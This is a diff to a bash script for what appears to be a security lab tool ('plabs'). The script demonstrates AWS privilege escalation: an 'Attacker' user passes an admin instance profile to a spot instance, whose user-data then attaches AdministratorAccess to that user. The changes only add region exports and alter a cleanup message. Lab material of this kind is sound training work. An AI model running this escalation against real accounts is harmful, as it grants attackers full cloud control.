@@ -114,6 +114,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -131,6 +132,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -140,6 +142,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -182,6 +185,7 @@ echo -e "${GREEN}✓ User-data script prepared${NC}\n"
 echo -e "${YELLOW}Step 6: Finding Amazon Linux 2023 AMI${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
 AMI_ID=$(aws ec2 describe-images \
     --region $AWS_REGION \
@@ -213,6 +217,7 @@ echo -e "${GREEN}✓ Found AMI${NC}\n"
 echo -e "${YELLOW}Step 7: Determining VPC and subnet for spot instance${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Get default VPC and subnet
 show_cmd "ReadOnly" "aws ec2 --region "$AWS_REGION" describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text"
@@ -261,6 +266,7 @@ echo -e "${GREEN}✓ Launch specification prepared${NC}\n"
 echo -e "${YELLOW}Step 9: Requesting spot instance with admin instance profile${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation vector - passing the admin role to a spot instance..."
 echo "Instance profile: $INSTANCE_PROFILE"
 
@@ -288,6 +294,7 @@ echo -e "${GREEN}✓ Spot instance request submitted${NC}\n"
 echo -e "${YELLOW}Step 10: Waiting for spot request to be fulfilled${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This may take 1-2 minutes..."
 echo ""
 
@@ -334,6 +341,7 @@ fi
 echo -e "${YELLOW}Step 11: Waiting for user-data script to attach AdministratorAccess${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This may take 2-3 minutes while the instance starts and executes the script..."
 echo ""
 
@@ -372,6 +380,7 @@ echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "The starting user now has AdministratorAccess attached..."
 echo "Attempting to list IAM users with starting user credentials..."
 
@@ -438,7 +447,7 @@ echo -e "\n${RED}⚠ Warning: AdministratorAccess policy has been attached to th
 echo -e "${RED}⚠ The spot instance is still running and incurring charges${NC}"
 echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
-echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
+echo "  run plabs cleanup or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
